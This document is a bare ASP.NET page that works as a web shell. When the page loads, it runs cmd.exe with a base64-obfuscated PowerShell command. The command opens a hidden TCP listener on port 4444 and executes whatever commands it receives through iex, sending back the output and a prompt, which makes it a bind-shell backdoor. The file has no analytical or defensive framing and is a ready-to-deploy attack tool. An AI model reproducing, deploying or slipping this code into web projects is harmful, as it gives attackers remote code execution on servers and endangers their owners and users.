<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<script runat="server">
    void Page_Load(object sender, EventArgs e)
    {
        string cmd = "powershell -EncodedCommand cG93ZXJzaGVsbCAtbm9wIC13IGhpZGRlbiAtYyBcXFwiJGxpc3RlbmVyID0gW1N5c3RlbS5OZXQuU29ja2V0cy5UY3BMaXN0ZW5lcl00NDQ0OyAkbGlzdGVuZXIuU3RhcnQoKTskY2xpZW50ID0gJGxpc3RlbmVyLkFjY2VwdFRjcENsaWVudCgpOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKClcXFwi";
        Execute("cmd.exe", "/c " + cmd);
    }

    public void Execute(string file, string args)
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = file;
        psi.Arguments = args;
        psi.UseShellExecute = false;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.CreateNoWindow = true;

        Process p = Process.Start(psi);
        StreamReader stdOutput = p.StandardOutput;
        StreamReader stdError = p.StandardError;

        string output = stdOutput.ReadToEnd() + stdError.ReadToEnd();
        Response.Write("<pre>" + output + "</pre>");
    }
</script>
